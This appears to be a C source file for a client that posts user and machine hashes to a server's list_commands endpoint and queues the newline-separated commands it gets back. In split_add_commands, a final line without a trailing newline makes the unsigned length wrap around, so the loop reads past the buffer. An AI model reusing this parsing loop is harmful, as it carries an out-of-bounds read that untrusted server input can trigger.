#include "cmd_list.h"

#include <stdlib.h>

#include "command.h"
#include "logger/logger.h"
#include "sock/sockutils.h"
#include "utils/errors.h"

int split_add_commands(struct string data, struct queue *queue)
{
    while (1)
    {
        char *ptr = strchr(data.data, '\n');
        size_t length = ptr == NULL ? data.length : (size_t)(ptr - data.data);
        if (length == 0)
        {
            break;
        }

        struct command *command = command_create(data.data, length);
        if (command == NULL)
        {
            log_alloc_error("creating command from response");
            return FATAL;
        }

        if (queue_enqueue(queue, command))
        {
            log_alloc_error("enqueueing command");
            command_destroy(command);
            return FATAL;
        }

        data.data += length + 1;
        data.length -= length + 1;
    }

    return SUCCESS;
}

int list_commands(struct settings *settings, struct queue *queue)
{
    char *url_arr[] = {
        "/api/list_commands.php?user=",
        settings->user_hash,
        "&machine=",
        settings->machine_hash,
        NULL,
    };

    struct string response = NULL_STRING;
    int err = post_wrapper(settings, url_arr, NULL_STRING, &response);
    if (err != SUCCESS) {
        goto end;
    }

    // found commands, now list and categorize them
    // will assume they are well formed
    err = split_add_commands(response, queue);

end:
    STRING_FREE(response);
    return err;
}
